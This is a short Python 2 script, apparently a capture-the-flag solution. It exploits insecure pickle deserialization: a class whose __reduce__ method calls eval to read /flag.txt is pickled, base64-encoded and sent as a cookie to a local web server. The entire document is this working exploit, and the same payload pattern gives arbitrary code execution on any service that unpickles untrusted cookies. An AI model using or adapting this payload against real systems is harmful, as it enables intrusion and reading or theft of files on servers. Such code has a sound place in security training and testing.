#!/usr/bin/python2

import pickle
import base64
import requests

class Evil(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt').read()",))

cookie = base64.b64encode(pickle.dumps(Evil())).decode('UTF-8')

r = requests.get("http://localhost/", cookies={'data': cookie})

print(r.text)
